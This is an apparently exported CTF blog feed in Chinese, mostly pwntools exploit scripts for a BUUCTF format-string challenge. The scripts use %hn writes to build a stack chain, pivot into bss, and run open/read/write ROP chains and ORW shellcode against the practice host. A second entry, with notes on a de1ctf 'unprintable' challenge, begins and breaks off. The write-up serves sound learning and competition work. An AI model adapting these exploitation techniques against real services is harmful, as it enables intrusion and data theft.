class="built_in">hex</span>(base_addr))</span><br><span class="line">    pause()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_libc = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_libc-------------&gt;&#x27;</span>, <span class="built_in">hex</span>(leak_libc))</span><br><span class="line">    libc_base = leak_libc - <span class="number">0x21b97</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base---------&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    rsp_hook = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_hook----------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_hook))</span><br><span class="line"></span><br><span class="line">    rsp_addr = rsp_addr + base_addr</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_addr-----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_addr))</span><br><span class="line">    rsp_addr = rsp_addr &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_addr-----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_addr))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    hook1 = (rsp_hook + <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hook1-------------&gt;&#x27;</span>, <span class="built_in">hex</span>(hook1))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(hook1) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将menu函数的返回地址修改成pop rsp</span></span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rsp_addr) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入bss段指针</span></span><br><span class="line">    bss_hook = rsp_hook + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 布置迁移地址bss_addr+0x10  因为bss要存放d^3CTF and flag</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss_hook1-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_addr = base_addr + <span class="number">0x202060</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss1_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_addr + <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook2--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook3--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pop_rdx_addr = <span class="number">0x1b96</span> + libc_base</span><br><span class="line">    pop_rdi_addr = base_addr + <span class="number">0xbc3</span></span><br><span class="line">    pop_rsi_r15_addr = base_addr + <span class="number">0xbc1</span></span><br><span class="line">    read_addr = <span class="number">0x110070</span> + libc_base</span><br><span class="line">    write_addr = libc_base + <span class="number">0x110140</span></span><br><span class="line">    open_addr = libc_base + <span class="number">0x10fc40</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;d^3CTF\x00\x00&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># open(flag_addr,0)</span></span><br><span class="line">    payload += p64(pop_rdi_addr) + p64(base_addr + <span class="number">0x202068</span>)</span><br><span class="line">    payload += p64(pop_rsi_r15_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(open_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># read(1,base_addr+0x202060+0x300,0x100)</span></span><br><span class="line">    payload += p64(pop_rdi_addr) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(pop_rsi_r15_addr) + p64(base_addr + <span class="number">0x202060</span> + <span class="number">0x300</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rdx_addr) + p64(<span class="number">0x100</span>)</span><br><span class="line">    payload += p64(read_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># write(2,base_addr+0x202060+0x300,0x100)</span></span><br><span class="line">    payload += p64(pop_rdi_addr) + p64(<span class="number">2</span>)</span><br><span class="line">    payload += p64(pop_rsi_r15_addr) + p64(base_addr + <span class="number">0x202060</span> + <span class="number">0x300</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rdx_addr) + p64(<span class="number">0x100</span>)</span><br><span class="line">    payload += p64(write_addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(&#x27;./a&#x27;)</span></span><br><span class="line">    p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28285</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220429211253788-2009575560.png" alt="image-20220429204629254"></p><h2 id="2、用shellcode执行orw">2、用shellcode执行orw</h2><p>这个本地看到flag了，但是远程有问题，也在此记录一下。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from pwncli import *</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    io_stderr_addr = libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;io_stderr_addr------------&gt;&#x27;</span>, <span class="built_in">hex</span>(io_stderr_addr))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    print_ret_addr = leak_addr - <span class="number">0x20</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;print_ret_addr--------&gt;&#x27;</span>, <span class="built_in">hex</span>(print_ret_addr))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;构造栈链，第一次构造一个指向buf的栈地址&#x27;&#x27;&#x27;</span></span><br><span class="line">    leak = (leak_addr) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(leak) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    rsp_addr = <span class="number">0xbbd</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;第二次通过指向buf的栈地址，将buf修改为stdout&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x20</span>) + <span class="string">&#x27;c%10$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;第三次通过stdout将_IO_2_1_stdout_改成_IO_2_1_stderr_值，此时需要爆破倒数第二字节的前半字节，猜测为0，概率1/16&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    stderr = io_stderr_addr &amp; <span class="number">0xfff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;stderr------------&gt;&#x27;</span>, <span class="built_in">hex</span>(stderr))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stderr) + <span class="string">&#x27;c%9$hn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;下面来判断是否将stdout指向的值改写成stderr指向的值&#x27;&#x27;&#x27;</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">    x = p.recvuntil(<span class="string">&#x27;aa&#x27;</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;aa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;XXXXXX&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;success-----------------------------------------&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    payload = <span class="string">&#x27;%19$p%15$p%6$p&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    main_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># main_addr=u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main_addr----------&gt;&#x27;</span>, <span class="built_in">hex</span>(main_addr))</span><br><span class="line">    base_addr = main_addr - <span class="number">0xb24</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;base_addr----------&gt;&#x27;</span>, <span class="built_in">hex</span>(base_addr))</span><br><span class="line">    pause()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_libc=<span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;leak_libc-------------&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line">    libc_base = leak_libc- <span class="number">0x21b97</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_base---------&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    rsp_hook = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_hook----------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x10a2fc</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;one_gadget--------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">    high_addr = (one_gadget &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;high_addr---------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(high_addr))</span><br><span class="line">    medium_addr = (one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;medium_addr-------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(medium_addr))</span><br><span class="line">    low_addr = (one_gadget) &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;low_addr----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(low_addr))</span><br><span class="line"></span><br><span class="line">    rsp_addr = rsp_addr + base_addr</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_addr-----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_addr))</span><br><span class="line">    rsp_addr = rsp_addr &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rsp_addr-----------------------&gt;&#x27;</span>, <span class="built_in">hex</span>(rsp_addr))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    hook1 = (rsp_hook + <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hook1-------------&gt;&#x27;</span>, <span class="built_in">hex</span>(hook1))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(hook1) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将menu函数的返回地址修改成pop rsp</span></span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rsp_addr) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入bss段指针</span></span><br><span class="line">    bss_hook = rsp_hook + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload=&#x27;%&#x27;+str(low_addr)+&#x27;c%10$hn&#x27;</span></span><br><span class="line">    <span class="comment"># p.sendline(payload.ljust(0x12c-1,&#x27;\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#布置迁移地址bss_addr+8  因为bss要存放d^3CTF</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss_hook1-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_addr = base_addr + <span class="number">0x202060</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss1_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_addr+<span class="number">8</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook2--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook3--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># lb = LibcBox()</span></span><br><span class="line">    <span class="comment"># lb.add_symbol(&#x27;__libc_start_main&#x27;, leak_libc)  # 这个地方跟libcsearcher用法基本一样，下面也是去dump出来</span></span><br><span class="line">    <span class="comment"># lb.search(download_so=1)</span></span><br><span class="line">    <span class="comment"># libc_base = puts_addr - lb.dump(&#x27;__libc_start_main&#x27;)</span></span><br><span class="line"></span><br><span class="line">    mprotect_addr=libc_base+<span class="number">0x11bae0</span></span><br><span class="line">    read_addr=<span class="number">0x116600</span>+libc_base</span><br><span class="line">    write_addr=libc_base+<span class="number">0x1166a0</span></span><br><span class="line">    open_addr=libc_base+<span class="number">0x10fc40</span></span><br><span class="line">    <span class="comment">#mprotect(bss_addr,0x100000,7)</span></span><br><span class="line">    csu1_gadget=base_addr+<span class="number">0xbba</span></span><br><span class="line">    pop_rdx_addr=<span class="number">0x1b96</span>+libc_base</span><br><span class="line">    term_proc=base_addr+<span class="number">0x201DB8</span></span><br><span class="line">    magic_gadget=base_addr+<span class="number">0x8de</span></span><br><span class="line">    pop_rdi_addr=base_addr+<span class="number">0xbc3</span></span><br><span class="line">    pop_rsi_r15_addr=base_addr+<span class="number">0xbc1</span></span><br><span class="line">    </span><br><span class="line">    exit_addr=<span class="number">0x43120</span>+libc_base</span><br><span class="line">    alarm_offset=<span class="number">0xe44f0</span></span><br><span class="line">    alarm_got_addr=<span class="number">0x201FB0</span>+base_addr</span><br><span class="line">    orw_shellcode=<span class="string">&#x27;\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x02\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&#x27;</span></span><br><span class="line">    payload=<span class="string">&#x27;d^3CTF\x00\x00&#x27;</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(pop_rdi_addr)+p64(base_addr+<span class="number">0x202000</span>)</span><br><span class="line">    payload+=p64(pop_rsi_r15_addr)+p64(<span class="number">0x100000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(pop_rdx_addr)+p64(<span class="number">7</span>)</span><br><span class="line">    payload+=p64(mprotect_addr)</span><br><span class="line">    payload+=p64(base_addr+<span class="number">0x60</span>+<span class="number">0x202060</span>+<span class="number">0x8</span>)</span><br><span class="line">    payload+=orw_shellcode</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(&#x27;./a&#x27;)</span></span><br><span class="line">    p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25582</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    <span class="keyword">if</span> leak_addr &amp; <span class="number">0xffff</span> &gt; <span class="number">0x2000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;---------i------------&#x27;</span>, i)</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.recvuntil(<span class="string">&quot;may you enjoy my printf test!\n&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个是本地出的flag</p><p><img src="../img/2706180-20220429211252638-1134810034.png" alt="image-20220429204916689"></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> orw </tag>
            
            <tag> magic_gadget </tag>
            
            <tag> 格式化字符串漏洞 </tag>
            
            <tag> 沙箱 </tag>
            
            <tag> 栈迁移，close关闭文件描述符 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF_de1ctf_2019_unprintable</title>
      <link href="/posts/d34ee684.html"/>
      <url>/posts/d34ee684.html</url>
      
        <content type="html"><![CDATA[<h2 id="总结：">总结：</h2><blockquote><p>通过这道题的学习与收获有：</p><p>1、bss段的格式化字符串，需要找一条栈链，需要用栈地址-&gt;栈地址-&gt;栈地址-&gt;值，用第二个栈地址来控制第三个栈地址，将第三个栈地址当做跳板，最终去通过跳板的不断移动，去不断写入一或两字节的数据。<br>这里稍稍总结两句。<br>利用格式化字符漏洞来达到写的目的，分为两种情况。<br>如果输入直接是在栈中，那就可以去利用距栈顶偏移加我们构造地址，去达到任意地址任意写的目的。<br>如果输入是在bss段，那么要利用栈链，来进行任意地址任意写。</p></blockquote><blockquote><p>2、这道题的思路是一边利用格式化字符串漏洞去不断执行printf和read，一边在栈里写入bss段地址，为之后的栈迁移做打算。最后将布置好的rop链发送过去，让执行流迁移到rop链上，利用magic gadget来获取shell。</p><p>3、又收集到了一个新的magic gadget。adc    DWORD PTR [rbp+0x48],edx    机器码搜11554889</p><p>4、第一次遇见格式化字符函数自己修改自己的返回地址去执行自己… 另外就是格式化字符并不需要对齐，格式化字符后面的地址才需要对齐。</p><p>5、多注意栈里的数据，是否有特殊的存在。没思路的时候，就调试一下看看能不能找到有用的信息。</p></blockquote><h2 id="保护策略：">保护策略：</h2><p><img src="../img/2706180-20220419222501934-1369976080.png" alt=""></p><h2 id="程序分析：">程序分析：</h2><p><img src="../img/2706180-20220419222530244-1699956812.png" 